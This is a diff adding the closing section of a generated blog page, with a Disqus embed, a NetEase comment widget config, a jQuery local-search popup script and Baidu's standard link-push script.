+        s.src = 'https://iversion lee.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "a1fe7273de6e47ad9f9802a493c2cccf",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+</div></body></html>
